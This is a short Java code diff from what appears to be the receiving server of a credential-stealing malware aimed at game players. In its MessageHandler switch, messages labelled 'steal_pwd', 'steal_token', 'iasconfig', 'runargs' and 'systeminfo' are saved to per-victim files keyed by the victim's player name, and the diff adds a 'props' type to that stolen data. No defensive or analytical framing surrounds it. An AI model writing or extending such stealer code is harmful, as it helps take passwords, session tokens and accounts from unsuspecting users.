@@ -44,7 +44,7 @@ public class MessageHandler {
                     }
                     case "player" -> info.playerData = new Gson().fromJson(msg, JsonObject.class);
                     case "ip" -> info.ip = new Gson().fromJson(msg, JsonObject.class);
-                    case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
+                    case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo", "props" -> {
                         String ext = msgType.equals("systeminfo") ? "txt" : "json";
                         File file = new File("data/data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
                         FileUtil.write(file, msg);
